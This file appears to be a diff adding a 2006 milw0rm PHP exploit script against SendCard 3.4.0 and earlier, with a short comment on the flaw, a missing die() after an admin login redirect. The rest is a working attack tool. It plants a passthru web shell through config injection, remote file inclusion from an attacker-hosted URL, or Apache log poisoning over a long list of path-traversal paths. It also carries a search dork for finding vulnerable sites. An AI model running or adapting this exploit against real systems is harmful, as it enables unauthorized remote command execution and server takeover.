@@ -1,0 +1,308 @@
+#!/usr/bin/php -q -d short_open_tag=on
+<?
+echo "SendCard <= 3.4.0 unauthorized administrative access / remote commands\n";
+echo "execution exploit\n";
+echo "by rgod rgod@autistici.org\n";
+echo "site: http://retrogod.altervista.org\n";
+echo "dork: \"Powered by sendcard - an advanced PHP e-card program\"\n\n";
+
+if ($argc<4) {
+echo "Usage: php ".$argv[0]." host path action [location] [cmd] OPTIONS\n";
+echo "host:      target server (ip/hostname)\n";
+echo "path:      path to sendcard\n";
+echo "action:    1 -> php injection\n";
+echo "           works against magic_quotes_gpc=Off\n";
+echo "           2 -> arbitrary remote inclusion\n";
+echo "           works against allow_url_fopen=On\n";
+echo "           3 -> arbitrary local inclusion\n";
+echo "           works regardless of php.ini settings\n";
+echo "           and if you succeed to include Apache logs\n";
+echo "           4 -> read phpinfo()\n";
+echo "[location] a remote http location with the code to include\n";
+echo "           needed by 2, with an ending slash\n";
+echo "[cmd]:     a shell command, needed by 1-3\n";
+echo "Options:\n";
+echo "   -p[port]:    specify a port other than 80\n";
+echo "   -P[ip:port]: specify a proxy\n";
+echo "Example:\n";
+echo "php ".$argv[0]." localhost /sendcard/ 1 ls -la\n";
+echo "php ".$argv[0]." localhost /sendcard/ 2 http://somehost.com/ ls -la\n";
+echo "php ".$argv[0]." localhost /sendcard/ 3 ls -la\n";
+echo "php ".$argv[0]." localhost /sendcard/ 4 > phpinfo.html\n";
+echo "php ".$argv[0]." localhost /sendcard/ 4 -p81> phpinfo.html\n";
+echo "php ".$argv[0]." localhost /sendcard/ 4 -P1.1.1.1:80 > phpinfo.html\n";
+echo "note: for action 2 you need this code in http://somehost.com/sendcard_setup.php/index.html :\n";
+echo "<?php set_time_limit(0);echo 'sun-tzu';passthru(\$_SERVER(\"HTTP_CLIENT_IP\");echo 'sun-tzu';die;?>\n";
+die;
+}
+
+/*
+software site: http://www.sendcard.org/
+
+vulnerable code in admin/prepend.php near lines 32-34:
+
+[*]
+...
+	if(!isset($_SESSION['session']["password"]) || $_SESSION['session']["password"] != ADMIN_PASSWORD) {
+		header("Location: login.php?redirect=" . basename($_SERVER['PHP_SELF']));
+	}
+...
+
+should be instead:
+
+[**]
+...
+if(!isset($_SESSION['session']["password"]) || $_SESSION['session']["password"] != ADMIN_PASSWORD) {
+		header("Location: login.php?redirect=" . basename($_SERVER['PHP_SELF']));
+		die; // <---------------------[! ;)]
+	}
+...
+
+[*] is included by all scripts in admin/ folder
+this means that maybe redirection works if you try to access the admin scripts
+through the browser... but what happens if you do the bad work through a script? eheheheheheh
+
+so you can have access to all admin scripts to...
+(1) inject php code in config.php through admin/setup.php script,
+    this works fine with magic_quotes_gpc = Off
+(2) inject an arbitrary http location in config.php and go to admin/mod_stats.php
+    to include evil code from it, this works with allow_url_fopen=On
+(3) include an arbitrary file from local resource thorugh admin/mod_stats.php,
+    ex: apache logs, this works regardless of php.ini settings...
+(4) see phpinfo() through admin/mod_phpinfo.php to choose which exploitation method
+    is better eheheheheheheh
+
+									      */
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+   $c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+   }
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+}
+
+$c=4;$host=$argv[1];$path=$argv[2];$action=(int)$argv[3];
+if ($action==2) {$location=$argv[4]; $c=5;}$cmd="";$port=80;$proxy="";
+for ($i=$c; $i<$argc; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if ($action<>4)
+{
+if (($temp<>"-p") and ($temp<>"-P"))
+{$cmd.=" ".$argv[$i];}
+}
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+}
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+if ($action==1)
+{
+   $shell='suntzu");set_time_limit(0);echo "sun-tzu";passthru($_SERVER["HTTP_CLIENT_IP"]);echo "sun-tzu";die("suntzu';
+   $data="-----------------------------7d529a1d23092a\r\n";
+   $data.="Content-Disposition: form-data; name=\"cfg_docroot\";\r\n";
+   $data.="Content-Type:\r\n\r\n";
+   $data.="$shell\r\n";
+   $data.="-----------------------------7d529a1d23092a--\r\n";
+   $packet="POST ".$p."admin/setup.php?save=1 HTTP/1.0\r\n";
+   $packet.="Content-Type: multipart/form-data; boundary=---------------------------7d529a1d23092a\r\n";
+   $packet.="Content-Length: ".strlen($data)."\r\n";
+   $packet.="Host: ".$host."\r\n";
+   $packet.="Connection: Close\r\n\r\n";
+   $packet.=$data;
+   sendpacketii($packet);
+   sleep(1);
+   $packet="GET ".$p."admin/config.php HTTP/1.0\r\n";
+   $packet.="CLIENT-IP: $cmd\r\n";
+   $packet.="Host: ".$host."\r\n";
+   $packet.="Connection: Close\r\n\r\n";
+   sendpacketii($packet);
+   if (strstr($html,"sun-tzu"))
+   {
+   echo "exploit succeeded...\n";
+   $temp=explode("sun-tzu",$html);
+   die($temp[1]);
+   }
+   else
+   {
+   echo "exploit failed...";
+   //debug
+   //echo $html;
+   }
+}
+elseif ($action==2)
+{
+   $data="-----------------------------7d529a1d23092a\r\n";
+   $data.="Content-Disposition: form-data; name=\"cfg_docroot\";\r\n";
+   $data.="Content-Type:\r\n\r\n";
+   $data.="$location\r\n";
+   $data.="-----------------------------7d529a1d23092a--\r\n";
+   $packet="POST ".$p."admin/setup.php?save=1 HTTP/1.0\r\n";
+   $packet.="Content-Type: multipart/form-data; boundary=---------------------------7d529a1d23092a\r\n";
+   $packet.="Content-Length: ".strlen($data)."\r\n";
+   $packet.="Host: ".$host."\r\n";
+   $packet.="Connection: Close\r\n\r\n";
+   $packet.=$data;
+   sendpacketii($packet);
+   $packet="GET ".$p."admin/mod_stats.php HTTP/1.0\r\n";
+   $packet.="CLIENT-IP: $cmd\r\n";
+   $packet.="Host: ".$host."\r\n";
+   $packet.="Connection: Close\r\n\r\n";
+   sendpacketii($packet);
+   if (strstr($html,"sun-tzu"))
+   {
+   echo "exploit succeeded...\n";
+   $temp=explode("sun-tzu",$html);
+   die($temp[1]);
+   }
+   else
+   {
+   //debug
+   echo $html;
+   echo "exploit failed...see html to adjust the path...";
+   }
+}
+elseif ($action==3)
+{
+$CODE="<?php set_time_limit(0);echo chr(115).chr(117).chr(110).chr(45).chr(116).chr(122).chr(117);passthru(\$_SERVER[HTTP_CLIENT_IP]);echo chr(115).chr(117).chr(110).chr(45).chr(116).chr(122).chr(117);die;?>";
+$packet="GET ".$p.$CODE." HTTP/1.1\r\n";
+$packet.="User-Agent: ".$CODE."\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: close\r\n\r\n";
+#debug
+#echo quick_dump($packet);
+sendpacketii($packet);
+sleep(2);
+$paths= array (
+"../../../../../../../../../../var/log/httpd/access_log",
+"../../../../../../../../../../var/log/httpd/error_log",
+"../apache/logs/error.log",
+"../apache/logs/access.log",
+"../../apache/logs/error.log",
+"../../apache/logs/access.log",
+"../../../apache/logs/error.log",
+"../../../apache/logs/access.log",
+"../../../../apache/logs/error.log",
+"../../../../apache/logs/access.log",
+"../../../../../apache/logs/error.log",
+"../../../../../apache/logs/access.log",
+"../logs/error.log",
+"../logs/access.log",
+"../../logs/error.log",
+"../../logs/access.log",
+"../../../logs/error.log",
+"../../../logs/access.log",
+"../../../../logs/error.log",
+"../../../../logs/access.log",
+"../../../../../logs/error.log",
+"../../../../../logs/access.log",
+"../../../../../../../../../../etc/httpd/logs/acces_log",
+"../../../../../../../../../../etc/httpd/logs/acces.log",
+"../../../../../../../../../../etc/httpd/logs/error_log",
+"../../../../../../../../../../etc/httpd/logs/error.log",
+"../../../../../../../../../../var/www/logs/access_log",
+"../../../../../../../../../../var/www/logs/access.log",
+"../../../../../../../../../../usr/local/apache/logs/access_log",
+"../../../../../../../../../../usr/local/apache/logs/access.log",
+"../../../../../../../../../../var/log/apache/access_log",
+"../../../../../../../../../../var/log/apache/access.log",
+"../../../../../../../../../../var/log/access_log",
+"../../../../../../../../../../var/www/logs/error_log",
+"../../../../../../../../../../var/www/logs/error.log",
+"../../../../../../../../../../usr/local/apache/logs/error_log",
+"../../../../../../../../../../usr/local/apache/logs/error.log",
+"../../../../../../../../../../var/log/apache/error_log",
+"../../../../../../../../../../var/log/apache/error.log",
+"../../../../../../../../../../var/log/access_log",
+"../../../../../../../../../../var/log/error_log"
+);
+
+for ($i=0; $i<count($paths); $i++)
+{
+  echo "trying with $paths[$i] for plugin_file argument\r\n";
+  $packet="GET ".$p."admin/mod_plugins.php HTTP/1.0\r\n";
+  $packet.="Host: ".$host."\r\n";
+  $packet.="CLIENT-IP: $cmd\r\n";
+  $packet.="Cookie: plugin_file=".urlencode($paths[$i]).";\r\n";
+  $packet.="Connection: Close\r\n\r\n";
+  sendpacketii($packet);
+  if (strstr($html,"sun-tzu"))
+  {
+  echo "exploit succeeded...\n\n";
+  $temp=explode("sun-tzu",$html);
+  echo $temp[1]; die;
+  }
+}
+//if you are here...
+die("exploit failed...");
+}
+elseif ($action==4)
+{
+   $packet="GET ".$p."admin/mod_phpinfo.php HTTP/1.0\r\n";
+   $packet.="Host: ".$host."\r\n";
+   $packet.="Connection: Close\r\n\r\n";
+   sendpacketii($packet);
+   $temp=explode("<!DOCTYPE",$html); //remove http headers
+   echo "<!DOCTYPE".$temp[1];
+}
+else echo ("specify an action [1-4]...");
+?>
+
+# milw0rm.com [2006-08-03]
